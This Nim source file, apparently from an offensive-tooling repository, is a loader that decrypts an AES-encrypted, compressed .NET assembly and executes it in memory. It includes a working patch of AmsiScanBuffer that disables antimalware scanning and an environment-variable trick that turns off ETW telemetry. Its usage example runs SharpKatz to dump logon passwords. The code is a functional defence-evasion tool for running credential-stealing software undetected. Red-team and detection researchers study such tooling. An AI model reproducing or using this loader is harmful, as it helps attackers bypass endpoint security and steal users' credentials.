#[
    Authors: Marcello Salvati (@byt3bl33d3r), @S3cur3Th1sSh1t, @snovvcrash
    License: BSD 3-Clause
    References:
      - https://github.com/khchen/winim/blob/master/examples/clr/usage_demo2.nim
      - https://github.com/byt3bl33d3r/OffensiveNim

    Usage:
      Cmd > nim c encrypt_assembly.nim
      Cmd > nim c encrypted_assembly_loader.nim
      Cmd > .\encrypt_assembly.exe <PASSWORD> <CSHARP_BINARY.EXE> <ENCRYPTED_B64.TXT>
      Cmd > .\encrypted_assembly_loader.exe [ARG1] [ARG1] ...

    Example with https://github.com/b4rtik/SharpKatz:
      Cmd > .\encrypt_assembly.exe Passw0rd! SharpKatz.exe sharpkatz.txt
      Cmd > .\encrypted_assembly_loader.exe --Command logonpasswords
]#

import os
import strformat
import dynlib
import base64
import winim/clr except `[]`
import winim/lean
import nimcrypto
import nimcrypto/sysrand
import zippy

let
    usePatchAmsi = false
    useBlockETW = false
    password: string = "StaticPassword"
    binary: string = "BASE64EncodedFile"

when defined amd64:
    echo "[*] Running in x64 process"
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    echo "[*] Running in x86 process"
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]


proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying AMSI patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled


proc BlockETW(): bool =
    # Disable ETW via https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/
    var cometw: string = "COMPlus_ETWEnabled"
    var setnull: string = "0"
    putenv(cometw, setnull)
    return true


func toByteSeq*(str: string): seq[byte] {.inline.} =
    # Converts a string to the corresponding byte sequence
    @(str.toOpenArrayByte(0, str.high))


when isMainModule:
    if usePatchAmsi == true:
        var patchAmsiSuccess: bool = PatchAmsi()
        echo fmt"[*] AMSI disabled: {bool(patchAmsiSuccess)}"

when isMainModule:
    if useBlockETW == true:
        var blockETWSuccess: bool = BlockETW()
        echo fmt"[*] ETW blocked: {bool(blockETWSuccess)}"

var
    inFileContents: string = binary
    encrypted: seq[byte] = toByteSeq(decode(inFileContents))
    dctx: CTR[aes256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    decrypted: seq[byte] = newSeq[byte](len(encrypted))

# Create Random IV
iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]

# Expand key to 32 bytes using SHA256 as the KDF
var expandedKey = sha256.digest(password)
copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

dctx.init(key, iv)
dctx.decrypt(encrypted, decrypted)
dctx.clear()

var dectextstring: string = cast[string](decrypted)
var decompressed: string = uncompress(dectextstring,dfGzip)
var assembly = load(toByteSeq(decompressed))

var cmd: seq[string]
var i = 1
while i <= paramCount():
    cmd.add(paramStr(i))
    inc(i)
echo cmd
var arr = toCLRVariant(cmd, VT_BSTR)
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
